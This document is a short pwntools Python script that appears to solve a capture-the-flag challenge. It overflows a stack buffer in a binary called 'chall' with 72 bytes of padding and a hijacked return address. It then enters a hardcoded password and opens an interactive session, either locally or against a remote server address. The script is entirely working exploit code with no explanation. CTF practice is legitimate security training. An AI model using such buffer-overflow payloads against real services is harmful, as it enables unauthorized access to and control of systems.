#!/usr/bin/python3

from pwn import *

exe = 'chall'
elf = context.binary = ELF(exe, checksec = False)
libc = elf.libc

encode  = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l.ljust(8, b"\x00"))
info = lambda msg: log.info(msg)
sla  = lambda msg, data: p.sendlineafter(msg, data)
sa   = lambda msg, data: p.sendafter(msg, data)
sl   = lambda data: p.sendline(data)
s    = lambda data: p.send(data)
r    = lambda nbytes: p.recv(nbytes)
ru   = lambda data: p.recvuntil(data)
rl   = lambda : p.recvline()


def GDB(): gdb.attach(p, gdbscript='''
b*0x401288
b*0x00000000004014FF
c
''') if not args.REMOTE else None

p = remote('183.91.11.30', 1969) if args.REMOTE else process(argv=[exe], aslr=False)
if args.GDB: GDB(); input()
payload = b'A' * 72 + p64(0x000000000040135A + 1)
sla(b'Enter your choice:', encode(1))
sla(b'Enter quantum coordinates:', payload)
sla(b'password: ', b'qu4ntumR3ality')
p.interactive()
